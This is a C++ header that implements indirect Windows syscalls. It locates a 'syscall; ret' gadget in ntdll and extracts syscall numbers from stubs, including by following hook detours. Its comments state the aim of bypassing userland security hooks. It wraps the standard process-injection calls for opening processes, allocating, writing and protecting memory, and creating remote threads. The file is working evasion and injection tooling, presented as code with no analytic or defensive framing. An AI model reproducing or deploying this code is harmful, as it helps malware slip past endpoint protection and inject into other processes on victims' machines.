#pragma once
#include <Windows.h>
#include <winternl.h>
#include <cstdint>

// Indirect syscall stubs — SSN resolved at runtime from a clean ntdll copy.
// All sensitive NT calls go through these; userland hooks in ntdll.dll are bypassed.

#pragma comment(lib, "ntdll.lib")

namespace Syscall {

    struct SyscallEntry {
        DWORD  ssn;
        PVOID  syscallGadget; // "syscall; ret" gadget in ntdll text
    };

    // Resolved SSNs
    inline SyscallEntry NtAllocateVirtualMemory_entry{};
    inline SyscallEntry NtWriteVirtualMemory_entry{};
    inline SyscallEntry NtProtectVirtualMemory_entry{};
    inline SyscallEntry NtCreateThreadEx_entry{};
    inline SyscallEntry NtOpenProcess_entry{};
    inline SyscallEntry NtQueryVirtualMemory_entry{};
    inline SyscallEntry NtClose_entry{};

    // Locate a "syscall; ret" gadget in the .text section of ntdll
    inline PVOID FindSyscallGadget(HMODULE ntdll) {
        auto base = reinterpret_cast<PBYTE>(ntdll);
        auto dos   = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
        auto nt    = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);

        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            if (memcmp(sec->Name, ".text", 5) != 0) continue;
            auto start = base + sec->VirtualAddress;
            auto end   = start + sec->Misc.VirtualSize - 1;
            for (auto p = start; p < end; ++p) {
                // syscall (0F 05) ret (C3)
                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
                    return p;
            }
        }
        return nullptr;
    }

    // Extract SSN from the first 5 bytes of a Nt* stub: mov eax, <ssn>
    inline DWORD ExtractSSN(PVOID funcAddr) {
        auto bytes = reinterpret_cast<PBYTE>(funcAddr);
        // Hooked stubs start with jmp — walk past the detour
        if (bytes[0] == 0xE9) {
            // Follow jmp rel32
            auto target = reinterpret_cast<PBYTE>(funcAddr)
                + 5 + *reinterpret_cast<INT32*>(bytes + 1);
            bytes = target;
        }
        // mov eax, imm32 (B8 xx xx xx xx)
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8)
            return *reinterpret_cast<DWORD*>(bytes + 4);
        if (bytes[0] == 0xB8)
            return *reinterpret_cast<DWORD*>(bytes + 1);
        return 0xFFFFFFFF;
    }

    inline bool Resolve(HMODULE ntdll) {
        auto gadget = FindSyscallGadget(ntdll);
        if (!gadget) return false;

        struct { const char* name; SyscallEntry* entry; } funcs[] = {
            { "NtAllocateVirtualMemory", &NtAllocateVirtualMemory_entry },
            { "NtWriteVirtualMemory",    &NtWriteVirtualMemory_entry    },
            { "NtProtectVirtualMemory",  &NtProtectVirtualMemory_entry  },
            { "NtCreateThreadEx",        &NtCreateThreadEx_entry        },
            { "NtOpenProcess",           &NtOpenProcess_entry           },
            { "NtQueryVirtualMemory",    &NtQueryVirtualMemory_entry    },
            { "NtClose",                 &NtClose_entry                 },
        };

        for (auto& f : funcs) {
            auto addr = GetProcAddress(ntdll, f.name);
            if (!addr) return false;
            f.entry->ssn           = ExtractSSN(addr);
            f.entry->syscallGadget = gadget;
            if (f.entry->ssn == 0xFFFFFFFF) return false;
        }
        return true;
    }

} // namespace Syscall

// ── Indirect syscall thunk (x64 MASM-style via inline asm workaround) ──────
// We store SSN in rax, jump to the real "syscall; ret" gadget.
// The caller ABI is identical to the NT function so no shim is needed.

extern "C" {
    NTSTATUS IndirectNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS IndirectNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS IndirectNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS IndirectNtCreateThreadEx(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
        HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    NTSTATUS IndirectNtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
}